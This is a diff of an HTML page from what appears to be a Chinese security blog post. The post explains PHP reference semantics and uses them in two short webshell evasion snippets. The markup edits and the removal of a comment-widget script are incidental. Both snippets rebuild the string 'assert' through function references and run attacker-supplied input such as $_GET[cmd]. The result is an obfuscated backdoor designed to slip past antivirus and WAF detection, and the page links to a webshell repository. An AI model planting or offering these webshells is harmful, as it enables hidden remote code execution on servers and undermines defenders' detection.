@@ -117,7 +117,7 @@
 
         <span itemprop="articleBody"><h3 id="0x00-php中的">0x00 php中的&amp;</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>1.函数的参数引用
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.函数的参数引用
 &lt;?php
 function test(&amp;$a){ 
     $a=$a+100; 
@@ -149,14 +149,13 @@ $a=test();//这条语句会输出$b的值为6
 
 理解参考:
 http://www.cnblogs.com/thinksasa/p/3334492.html
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="0x01-detail">0x01 Detail</h3>
 
 <h4 id="a利用函数的参数引用免杀">a)利用函数的参数引用免杀</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?php
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
 function foo(&amp;$var)
 {
     $var=$var.'t';
@@ -164,12 +163,11 @@ function foo(&amp;$var)
 $a="asser";
 foo($a);
 $a($_GET[cmd]);
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="b利用函数的返回引用免杀">b)利用函数的返回引用免杀</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?php
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
 class talker{
     public $data = 'Hi';
     public function &amp; get(){
@@ -189,8 +187,7 @@ $a="asser";
 foo($a);
 $a($aa-&gt;data);
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>本文代码下载<br />
 <a href="https://github.com/3xp10it/xwebshell/tree/master/php/%26">download</a></p>
@@ -231,16 +228,6 @@ $a($aa-&gt;data);
 
 
 
-      
-<!--PC和WAP自适应版-->
-<div id="SOHUCS" style="width:980px"></div> 
-<script type="text/javascript"> 
-(function(){ 
-var appid = 'cyt1tnTcP'; 
-var conf = 'prod_a926ede5ea067744d582783ccd509c1f'; 
-var width = window.innerWidth || document.documentElement.clientWidth; 
-if (width < 960) { 
-window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="http://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("http://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
       
 
 
